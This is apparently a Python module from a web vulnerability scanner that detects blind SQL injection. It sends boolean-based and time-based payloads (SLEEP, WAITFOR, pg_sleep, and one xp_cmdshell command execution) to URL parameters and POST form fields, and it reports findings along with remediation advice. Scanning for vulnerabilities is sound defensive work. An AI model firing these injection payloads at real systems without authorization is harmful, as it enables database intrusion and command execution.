"""
Blind SQL Injection Checker
- Boolean-based: compara respostas com condição verdadeira vs. falsa
- Time-based: mede atraso causado por SLEEP/WAITFOR
- Testa parâmetros descobertos pelo crawler + parâmetros comuns
"""

import requests
import urllib3
import time
import difflib
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from modules.rate_limiter import get_limiter

urllib3.disable_warnings()
HEADERS = {"User-Agent": "Mozilla/5.0 VulnScanner/4.0"}


def _build_headers(auth=None):
    h = dict(HEADERS)
    if auth:
        if auth.get("auth_headers"):
            h.update(auth["auth_headers"])
        if auth.get("cookies"):
            h["Cookie"] = auth["cookies"]
    return h


def _similarity(a: str, b: str) -> float:
    """Retorna similaridade entre dois textos (0.0 a 1.0)."""
    return difflib.SequenceMatcher(None, a[:3000], b[:3000]).ratio()


# Payloads boolean-based por banco de dados
BOOLEAN_PAYLOADS = [
    # (true_payload, false_payload, db_hint)
    ("1 AND 1=1--",           "1 AND 1=2--",           "Generic"),
    ("1' AND '1'='1'--",      "1' AND '1'='2'--",      "Generic"),
    ("1 AND 1=1#",            "1 AND 1=2#",             "MySQL"),
    ("1' AND SLEEP(0)='0",    "1' AND SLEEP(0)='1",     "MySQL"),
    ("1 AND 1=1; --",         "1 AND 1=2; --",          "MSSQL"),
    ("1' AND 1=1 LIMIT 1--",  "1' AND 1=2 LIMIT 1--",  "MySQL/PostgreSQL"),
]

# Payloads time-based por banco de dados
TIME_PAYLOADS = [
    ("1' AND SLEEP(4)--",                                    "MySQL",      4.0),
    ("1; WAITFOR DELAY '0:0:4'--",                          "MSSQL",      4.0),
    ("1' AND pg_sleep(4)--",                                 "PostgreSQL", 4.0),
    ("1 AND 1=1 AND SLEEP(4)--",                            "MySQL",      4.0),
    ("1'; SELECT SLEEP(4)--",                                "MySQL",      4.0),
    ("1 UNION SELECT SLEEP(4)--",                           "MySQL",      4.0),
    ("1; SELECT pg_sleep(4)--",                             "PostgreSQL", 4.0),
    ("1' OR SLEEP(4)='0",                                    "MySQL",      4.0),
    ("1; EXEC xp_cmdshell('ping -n 4 127.0.0.1')--",       "MSSQL",      4.0),
]

COMMON_PARAMS = [
    "id", "user", "uid", "page", "cat", "category", "item", "product",
    "article", "news", "post", "pid", "sid", "tid", "aid", "bid",
    "search", "q", "query", "s", "keyword", "name", "username",
    "order", "sort", "limit", "offset", "ref", "code",
]


def _test_boolean(base_url: str, param: str, auth=None, limiter=None) -> dict | None:
    """
    Testa boolean-based SQLi num parâmetro.
    Retorna finding dict se vulnerável, None caso contrário.
    """
    h = _build_headers(auth)

    # Baseline com valor neutro
    try:
        if limiter:
            limiter.wait()
        baseline = requests.get(
            f"{base_url}?{param}=1", timeout=10, verify=False, headers=h
        )
        baseline_text = baseline.text
    except Exception:
        return None

    for true_pay, false_pay, db_hint in BOOLEAN_PAYLOADS:
        try:
            if limiter:
                limiter.wait()
            resp_true = requests.get(
                f"{base_url}?{param}={requests.utils.quote(true_pay)}",
                timeout=10, verify=False, headers=h
            )
            if limiter:
                limiter.wait()
            resp_false = requests.get(
                f"{base_url}?{param}={requests.utils.quote(false_pay)}",
                timeout=10, verify=False, headers=h
            )
        except Exception:
            continue

        sim_true_base = _similarity(baseline_text, resp_true.text)
        sim_false_base = _similarity(baseline_text, resp_false.text)
        sim_true_false = _similarity(resp_true.text, resp_false.text)

        # Condição verdadeira similar ao baseline, falsa diferente = blind SQLi
        if sim_true_base > 0.85 and sim_false_base < 0.75 and sim_true_false < 0.80:
            return {
                "severity": "critical",
                "title": f"Blind SQLi Boolean-Based detectado — parâmetro: {param}",
                "detail": (
                    f"O parâmetro '{param}' responde diferentemente a condições SQL "
                    f"verdadeiras vs. falsas. "
                    f"Similaridade TRUE/baseline: {sim_true_base:.2f} | "
                    f"FALSE/baseline: {sim_false_base:.2f} | "
                    f"DB provável: {db_hint} | "
                    f"Payload TRUE: {true_pay} | Payload FALSE: {false_pay}"
                ),
                "fix": (
                    "Use prepared statements / parameterized queries. "
                    "NUNCA concatene inputs em queries SQL. "
                    "Implemente WAF e validação de entrada."
                ),
                "cvss": "9.8",
            }

    return None


def _test_time_based(base_url: str, param: str, auth=None, limiter=None) -> dict | None:
    """
    Testa time-based SQLi num parâmetro.
    Retorna finding dict se vulnerável, None caso contrário.
    """
    h = _build_headers(auth)

    # Baseline de tempo de resposta
    try:
        if limiter:
            limiter.wait()
        t0 = time.time()
        requests.get(f"{base_url}?{param}=1", timeout=12, verify=False, headers=h)
        baseline_time = time.time() - t0
    except Exception:
        return None

    for payload, db_hint, expected_delay in TIME_PAYLOADS:
        try:
            if limiter:
                limiter.wait()
            t0 = time.time()
            requests.get(
                f"{base_url}?{param}={requests.utils.quote(payload)}",
                timeout=expected_delay + 6, verify=False, headers=h
            )
            elapsed = time.time() - t0
        except requests.exceptions.Timeout:
            # Timeout é evidência forte de time-based SQLi
            return {
                "severity": "critical",
                "title": f"Blind SQLi Time-Based detectado (timeout) — parâmetro: {param}",
                "detail": (
                    f"O payload '{payload}' causou timeout na resposta do parâmetro '{param}'. "
                    f"DB provável: {db_hint}."
                ),
                "fix": (
                    "Use prepared statements / parameterized queries. "
                    "NUNCA concatene inputs em queries SQL."
                ),
                "cvss": "9.8",
            }
        except Exception:
            continue

        # Delay significativamente maior que baseline
        if elapsed > (baseline_time + expected_delay * 0.7):
            return {
                "severity": "critical",
                "title": f"Blind SQLi Time-Based detectado — parâmetro: {param}",
                "detail": (
                    f"Payload '{payload}' no parâmetro '{param}' causou atraso de "
                    f"{elapsed:.1f}s (baseline: {baseline_time:.1f}s). "
                    f"DB provável: {db_hint}."
                ),
                "fix": (
                    "Use prepared statements / parameterized queries. "
                    "NUNCA concatene inputs em queries SQL."
                ),
                "cvss": "9.8",
            }

    return None


def check_blind_sqli(url: str, crawl_data: dict = None, auth=None,
                     rate_profile: str = "normal") -> dict:
    """Detecta blind SQL injection em parâmetros da aplicação."""
    findings = []
    if not url.startswith("http"):
        url = "https://" + url

    base = url.rstrip("/")
    limiter = get_limiter(rate_profile)

    # Coleta todos os parâmetros para testar
    params_to_test = set(COMMON_PARAMS)
    if crawl_data:
        params_to_test.update(crawl_data.get("params", []))
        # Extrai parâmetros das URLs crawleadas
        for crawl_url in crawl_data.get("urls", []):
            parsed = urlparse(crawl_url)
            if parsed.query:
                params_to_test.update(parse_qs(parsed.query).keys())

    tested = 0
    found = 0

    for param in list(params_to_test)[:30]:  # Limite para performance
        # Time-based primeiro (mais confiável)
        finding = _test_time_based(base, param, auth=auth, limiter=limiter)
        if finding:
            findings.append(finding)
            found += 1
            tested += 1
            continue

        # Boolean-based
        finding = _test_boolean(base, param, auth=auth, limiter=limiter)
        if finding:
            findings.append(finding)
            found += 1

        tested += 1

    # Testa também em forms do crawler com POST
    if crawl_data:
        for form in crawl_data.get("forms", [])[:8]:
            if form.get("method", "GET").upper() != "POST":
                continue
            form_inputs = [
                i for i in form.get("inputs", [])
                if i.get("type") not in ("hidden", "submit", "button", "checkbox", "radio")
            ]
            for inp in form_inputs[:5]:
                param_name = inp.get("name", "")
                if not param_name:
                    continue
                for payload, db_hint, expected_delay in TIME_PAYLOADS[:3]:
                    try:
                        limiter.wait()
                        t0 = time.time()
                        requests.post(
                            form["action"],
                            data={param_name: payload},
                            timeout=expected_delay + 6,
                            verify=False,
                            headers=_build_headers(auth)
                        )
                        elapsed = time.time() - t0
                        if elapsed > expected_delay * 0.7:
                            findings.append({
                                "severity": "critical",
                                "title": f"Blind SQLi Time-Based em formulário POST — campo: {param_name}",
                                "detail": (
                                    f"Campo '{param_name}' no form {form['action'][:80]} "
                                    f"causou atraso de {elapsed:.1f}s com payload: {payload}. "
                                    f"DB provável: {db_hint}."
                                ),
                                "fix": "Use prepared statements / parameterized queries.",
                                "cvss": "9.8",
                            })
                            found += 1
                            break
                    except requests.exceptions.Timeout:
                        findings.append({
                            "severity": "critical",
                            "title": f"Blind SQLi Time-Based em formulário POST (timeout) — campo: {param_name}",
                            "detail": f"Payload '{payload}' causou timeout no campo '{param_name}' do form {form['action'][:80]}.",
                            "fix": "Use prepared statements / parameterized queries.",
                            "cvss": "9.8",
                        })
                        found += 1
                        break
                    except Exception:
                        continue

    findings.append({
        "severity": "info",
        "title": f"Blind SQLi: {tested} parâmetros testados, {found} vulnerabilidades encontradas",
        "detail": (
            f"Parâmetros testados (boolean + time-based): {tested}. "
            f"Inclui parâmetros comuns e descobertos pelo crawler."
        ),
        "fix": "",
    })

    if found == 0:
        findings.append({
            "severity": "info",
            "title": "Nenhum Blind SQLi detectado",
            "detail": "Respostas não indicaram variação por condição SQL nem atraso por SLEEP/WAITFOR.",
            "fix": "",
        })

    return {"module": "Blind SQL Injection", "icon": "ti-database-x", "findings": findings}
